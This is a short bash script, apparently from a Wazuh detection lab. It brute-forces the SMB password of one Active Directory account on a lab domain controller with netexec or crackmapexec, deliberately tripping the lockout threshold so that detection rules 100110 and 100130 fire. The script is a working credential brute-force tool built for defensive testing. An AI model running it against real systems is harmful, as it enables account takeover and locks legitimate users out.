#!/usr/bin/env bash
#
# 02-bruteforce-single.sh
# Hammer ONE account with many passwords fast. This deliberately crosses the
# 5-attempt lockout threshold, so it triggers:
#   - rule 100110 (brute force by username)
#   - rule 100130 (account lockout, 4740)
# Use it to see the lockout policy defend the account in real time.
#
# Usage:  ./02-bruteforce-single.sh jsmith
#
set -u

DC="10.0.10.10"
TARGET="${1:-jsmith}"
PASSWORDS="$(dirname "$0")/passwords.txt"

if command -v netexec >/dev/null 2>&1; then
    CME="netexec"
elif command -v crackmapexec >/dev/null 2>&1; then
    CME="crackmapexec"
else
    echo "Neither netexec nor crackmapexec is installed." >&2
    exit 1
fi

echo "[*] Brute forcing single account '$TARGET' on $DC"
echo "[*] This WILL lock the account (threshold is 5). That's the point."
echo

$CME smb "$DC" -u "$TARGET" -p "$PASSWORDS" --continue-on-success

echo
echo "[*] Done. '$TARGET' should now be locked out. Watch rule 100130 in Wazuh,"
echo "    and confirm on the DC:  Get-ADUser $TARGET -Properties LockedOut"
